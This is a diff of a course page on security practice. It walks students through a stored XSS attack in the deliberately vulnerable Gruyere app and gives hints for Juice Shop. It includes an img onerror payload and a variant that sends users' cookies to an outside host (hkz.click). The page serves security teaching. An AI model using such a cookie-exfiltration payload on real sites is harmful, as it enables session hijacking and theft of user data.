@@ -1,6 +1,6 @@
-## Security practice
+# Security practice
 
-You don't really internalize how security exploits work until you get some practice with them. One way to do this is to use a practice security web applications. There are lots of practice applications but we will discuss two of them, Gruyere and Juice Shop.
+You will not really internalize how security exploits work until you get some practice with them. One way to do this is to use a practice security web applications. There are lots of practice applications but we will discuss two of them, Gruyere and Juice Shop.
 
 ## Gruyere
 
@@ -14,7 +14,7 @@ You start the practice environment by following this [link](https://google-gruye
 
 ![Gruyere](gruyereHome.jpg)
 
-For the purposes of this instruction we are only going to talk about the Cross-Site Scripting (XSS) attacks. Feel free to explore everything that Gruyere as your time and interest allows.
+For the purposes of this instruction we are only going to talk about Cross-Site Scripting (XSS) attacks. Feel free to explore everything provided by Gruyere as your time and interest allows.
 
 ### Cross-Site Scripting (XSS)
 
@@ -24,11 +24,11 @@ Using what we have learned from the tasks, hints, and examples described in the 
 
 1. Create an account in the Gruyere application using some bogus user name and password.
 1. Navigate back to the home page.
-1. Select the `New Snippets` option in order to create a snippet that will show on the home screen for all user's of the application.
+1. Select the `New Snippets` option in order to create a snippet that will show on the home screen for all users of the application.
 
-   The application developers assumed a user would use the snippet functionality to share information about cheese, but you will use it to execute JavaScript for anyone who sees your snippet.
+   The Gruyere developers assumed the snippet functionality would be used to share information about cheese, but you will use it to execute a XSS attack on anyone who views your snippet.
 
-1. Paste the following into the input box and press submit.
+1. Paste the following into the snippet input box and press submit.
    ```html
    <img src="null" onerror="document.body.style.background='white'" />
    ```
@@ -40,7 +40,7 @@ Now, whenever any user of Gruyere goes to their home page they will see your sni
 
 If you logout of Gruyere and create a new user account, you will see that your attack works on all users.
 
-Changing the background color isn't very much of an attack, but it does visually demonstrate that you are in control. You could just have easily grabbed the user's cookie and sent it to a service endpoint where you could start collecting information on Gruyere customers.
+Changing the background color isn't very much of an attack, but it does visually demonstrate that you are have taken control of the application. You could just have easily grabbed the user's cookie and sent it to a service endpoint where you could start collecting information on Gruyere customers.
 
 ```html
 <img src="null" onerror="fetch(`https://hkz.click/xss/${document.cookie}`)" />
@@ -76,14 +76,14 @@ If you are at all interested in improving your security skills, you should take 
    ```
 1. You can now open your browser to `localhost:3000`. This will display the Juice Shop application.
 
-![JuiceShop Home](juiceShopHome.jpg)
+   ![JuiceShop Home](juiceShopHome.jpg)
 
 The idea with Juice Shop is that you are suppose to learn by digging in and experimenting. For a person that is new to security hacking this can be a bit daunting, and so here is a hint to get you started.
 
-You can solve the first hacking challenge by discovering the hidden score board view that shows you all of the possible challenges to solve and exposes the available tutorials. You can discover where the score board is by examining the contents of the `main.js` file in Dev Tools and seeing that it references a path named `score-board`. So if you change the url to be `localhost:3000/#score-board` you will see the following view.
+You can solve the first hacking challenge by discovering the hidden score board view that shows you all of the possible challenges to solve, and exposes the available tutorials. You can discover where the score board is by examining the contents of the `main.js` file in Dev Tools and seeing that it references a path named `score-board`. So if you change the url to be `localhost:3000/#/score-board` you will see the following view.
 
 ![JuiceShop Home](juiceShopScoreBoard.jpg)
 
 You can then find a challenge that looks interesting and try to solve it. Challenges that have a tutorial icon will step you through the challenge and explain how it works. You can then use that knowledge to solve challenges that don't have a tutorial.
 
-To get started it is suggested that you do the `DOM XSS` tutorial. This will show you how to do a XXS attack using the application search input.
+To begin, it is suggested that you do the `DOM XSS` tutorial. This will show you how to do a XXS attack using the application search input.
